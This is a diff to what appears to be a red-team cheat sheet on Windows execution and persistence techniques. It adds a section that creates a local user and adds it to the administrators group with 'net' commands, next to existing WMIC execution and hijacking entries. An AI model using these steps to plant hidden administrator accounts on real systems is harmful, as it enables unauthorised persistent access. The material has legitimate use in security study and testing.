@@ -44,6 +44,7 @@
     * [PowerShell NET Assembly](#powershell-net-assembly)
     * [WMIC Execution](#wmic-execution)
   * [Persistence](#persistence)
+    * [Creating Local Administrator User](#creating-local-adminstrator-user)
     * [COM Hijacking](#com-hijacking)
     * [DLL Hijacking](#dll-hijacking)
     * [Office Applications](#office-applications)
@@ -406,6 +407,14 @@ wmic process call create "\\.\globalroot\osdataroot\windows\notepad.exe"
 ```
 
 # **Persistence**
+
+## **Creating Local Administrator User**
+
+```
+net user <username> <password> /add
+
+net localgroup Adminstrators <username> /add
+```
 
 ## **COM Hijacking**
 
